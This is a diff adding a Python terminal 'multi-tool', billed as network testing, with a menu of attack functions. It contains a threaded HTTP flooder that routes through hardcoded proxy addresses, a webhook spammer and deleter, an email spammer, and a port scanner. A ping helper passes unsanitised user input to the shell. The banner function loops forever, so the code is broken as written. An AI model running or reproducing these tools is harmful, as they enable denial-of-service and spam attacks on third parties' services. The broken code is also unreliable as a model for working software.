@@ -1,0 +1,194 @@
+import os
+import sys
+import time
+import socket
+import requests
+import threading
+import phonenumbers
+import re
+from colorama import Fore, init
+from urllib.parse import urlparse
+from smtplib import SMTP
+
+init(autoreset=True)
+
+def rgb_gradient(start_color, end_color, steps):
+    r1, g1, b1 = start_color
+    r2, g2, b2 = end_color
+    gradient = []
+    for step in range(steps):
+        r = r1 + (r2 - r1) * step / steps
+        g = g1 + (g2 - g1) * step / steps
+        b = b1 + (b2 - b1) * step / steps
+        gradient.append((int(r), int(g), int(b)))
+    return gradient
+
+def rgb_to_ansi(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
+
+def center_text(text):
+    clean_text = re.sub(r'\033\[[0-9;]*m', '', text)
+    width = os.get_terminal_size().columns
+    padding = (width - len(clean_text)) // 2
+    return " " * padding + text
+
+def print_header():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    dark_purple = (128, 0, 128)
+    neon_red = (255, 0, 0)
+    gradient = rgb_gradient(dark_purple, neon_red, 10) + rgb_gradient(neon_red, dark_purple, 10)
+    
+    while True:
+        for color in gradient:
+            r, g, b = color
+            color_code = rgb_to_ansi(r, g, b)
+            banner = f"""{color_code}
+      ███▄ ▄███▓█    ██ ██▓ ▄▄▄█████▓██▄▄▄█████▓▒█████  ▒█████  ██▓    
+     ▓██▒▀█▀ ██▒██  ▓██▓██▒ ▓  ██▒ ▓▓██▓  ██▒ ▓▒██▒  ██▒██▒  ██▓██▒    
+     ▓██    ▓██▓██  ▒██▒██░ ▒ ▓██░ ▒▒██▒ ▓██░ ▒▒██░  ██▒██░  ██▒██░    
+     ▒██    ▒██▓▓█  ░██▒██░ ░ ▓██▓ ░░██░ ▓██▓ ░▒██   ██▒██   ██▒██░    
+     ▒██▒   ░██▒▒█████▓░██████▒██▒ ░░██░ ▒██▒ ░░ ████▓▒░ ████▓▒░██████▒
+     ░ ▒░   ░  ░▒▓▒ ▒ ▒░ ▒░▓  ▒ ░░  ░▓   ▒ ░░  ░ ▒░▒░▒░░ ▒░▒░▒░░ ▒░▓  ░
+     ░  ░      ░░▒░ ░ ░░ ░ ▒  ░ ░    ▒ ░   ░     ░ ▒ ▒░  ░ ▒ ▒░░ ░ ▒  ░
+     ░      ░   ░░░ ░ ░  ░ ░  ░      ▒ ░ ░     ░ ░ ░ ▒ ░ ░ ░ ▒   ░ ░   
+            ░     ░        ░  ░      ░             ░ ░     ░ ░     ░  ░
+    
+    >> Multi-Tool for Network Testing <<
+    >>   Coded with <3 by D0M1N8R    <<
+    {color_code}"""
+            
+            for line in banner.splitlines():
+                print(center_text(line))
+            time.sleep(0.1)
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+def centered_input(prompt):
+    return input(center_text(prompt)).lstrip()
+
+def ddos_target():
+    print_header()
+    target = centered_input(f"[+] Enter target (IP:port or URL): ")
+    if 'http' not in target: target = f'http://{target}'
+    proxies = ['http://45.155.68.127:3128','http://138.199.48.1:8443']
+    
+    def attack():
+        while True:
+            try: [requests.get(target, proxies={'http': p}, timeout=5) for p in proxies]
+            except: pass
+    
+    for _ in range(50): threading.Thread(target=attack).start()
+    centered_input(f"[!] Attack started - Press Enter to return")
+
+def ping_ip():
+    print_header()
+    ip = centered_input(f"[+] Enter IP to ping: ")
+    os.system(f'ping {ip} -n 4' if os.name == 'nt' else f'ping -c 4 {ip}')
+    centered_input(f"[!] Ping completed - Press Enter to return")
+
+def port_scan():
+    print_header()
+    target = centered_input(f"[+] Enter target IP: ")
+    open_ports = []
+    
+    def scan_port(port):
+        s = socket.socket()
+        s.settimeout(1)
+        try:
+            s.connect((target, port))
+            open_ports.append(port)
+            s.close()
+        except: pass
+    
+    for port in range(1, 60001): threading.Thread(target=scan_port, args=(port,)).start()
+    time.sleep(5)
+    print(center_text(f"Open ports: {open_ports}"))
+    centered_input(f"[!] Scan completed - Press Enter to return")
+
+def ip_info():
+    print_header()
+    ip = centered_input(f"[+] Enter IP: ")
+    apis = [f'http://ip-api.com/json/{ip}',f'https://ipinfo.io/{ip}/json',f'https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}']
+    results = []
+    
+    for api in apis:
+        try: results.append(requests.get(api).json())
+        except: pass
+    
+    country_counts = {}
+    for res in results:
+        country = res.get('country', res.get('country_name', 'Unknown'))
+        country_counts[country] = country_counts.get(country, 0) + 1
+    max_country = max(country_counts, key=country_counts.get)
+    print(center_text(f"Most likely country: {max_country}"))
+    centered_input(f"[!] Lookup completed - Press Enter to return")
+
+def webhook_menu():
+    while True:
+        print_header()
+        print(center_text(f"1. Webhook Spammer"))
+        print(center_text(f"2. Force Delete Webhook"))
+        print(center_text(f"99. Exit"))
+        choice = centered_input(f"[+] Choice: ")
+        
+        if choice == '1':
+            print_header()
+            url = centered_input(f"[+] Webhook URL: ")
+            msg = centered_input(f"[+] Message: ")
+            count = int(centered_input(f"[+] Count: ") or 5)
+            for _ in range(count): requests.post(url, json={'content': msg})
+            centered_input(f"[!] Spam completed - Press Enter to return")
+        
+        elif choice == '2':
+            print_header()
+            url = centered_input(f"[+] Webhook URL: ")
+            requests.delete(url)
+            centered_input(f"[!] Deletion attempted - Press Enter to return")
+        
+        elif choice == '99': break
+
+def phone_info():
+    print_header()
+    number = centered_input(f"[+] Phone (+countrycode...): ")
+    parsed = phonenumbers.parse(number, None)
+    print(center_text(f"Country: {phonenumbers.region_code_for_number(parsed)}"))
+    print(center_text(f"Carrier: {phonenumbers.carrier.name_for_number(parsed, 'en')}"))
+    centered_input(f"[!] Lookup completed - Press Enter to return")
+
+def email_spammer():
+    print_header()
+    to = centered_input(f"[+] Target email: ")
+    msg = centered_input(f"[+] Message: ")
+    count = int(centered_input(f"[+] Count (max 100): ") or 5)
+    count = min(count, 100)
+    
+    with SMTP('smtp.gmail.com', 587) as smtp:
+        smtp.starttls()
+        smtp.login('temp@email.com', 'password')
+        for _ in range(count): smtp.sendmail('temp@email.com', to, msg)
+    centered_input(f"[!] Emails sent - Press Enter to return")
+
+def main():
+    while True:
+        print_header()
+        print(center_text(f"1. DDos"))
+        print(center_text(f"2. IP Ping"))
+        print(center_text(f"3. Port Scanner"))
+        print(center_text(f"4. IP Info"))
+        print(center_text(f"5. Webhook"))
+        print(center_text(f"6. Phone Info"))
+        print(center_text(f"7. Email Spammer"))
+        print(center_text(f"00. Exit"))
+        
+        choice = centered_input(f"[+] Choice: ")
+        
+        if choice == '1': ddos_target()
+        elif choice == '2': ping_ip()
+        elif choice == '3': port_scan()
+        elif choice == '4': ip_info()
+        elif choice == '5': webhook_menu()
+        elif choice == '6': phone_info()
+        elif choice == '7': email_spammer()
+        elif choice == '00': sys.exit()
+
+if __name__ == "__main__":
+    main()
